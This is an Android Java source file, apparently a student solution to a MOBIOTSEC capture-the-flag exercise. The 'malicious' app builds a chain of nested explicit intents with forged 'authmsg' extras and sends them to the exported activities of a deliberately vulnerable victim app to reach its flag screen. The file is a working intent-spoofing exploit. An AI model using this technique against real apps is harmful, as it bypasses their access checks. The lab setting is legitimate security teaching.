package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    public static String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        String chain1 = "B-to-C";
        String chain2 = "A-to-B";
        String chain3 = "Main-to-A";

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.mobiotsec.victimapp", "com.mobiotsec.victimapp.C"));
        intent1.putExtra("authmsg", chain1);
        Log.i("MICHELE","intent1");

        Intent intent2 = new Intent();
        intent2.setComponent(new ComponentName("com.mobiotsec.victimapp", "com.mobiotsec.victimapp.B"));
        intent2.putExtra("authmsg", chain2);
        //intent2.putExtra("**********", "**********");
        Log.i("MICHELE","intent2");

        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName("com.mobiotsec.victimapp", "com.mobiotsec.victimapp.A"));
        intent3.putExtra("authmsg", chain3);
        //intent3.putExtra("**********", "**********");
        Log.i("MICHELE","intent3");

        Intent intent4 = new Intent();
        intent4.setComponent(new ComponentName("com.mobiotsec.victimapp", "com.mobiotsec.victimapp.MainAcitvity"));
        Log.i("MICHELE","intent4");

        intent1.putExtra("inception", intent2);
        intent2.putExtra("inner", intent3);
        intent3.putExtra("nested", intent4);

        startActivity(intent1);
        //At the end you click on click here to get flag inside the victim app gui
    }
}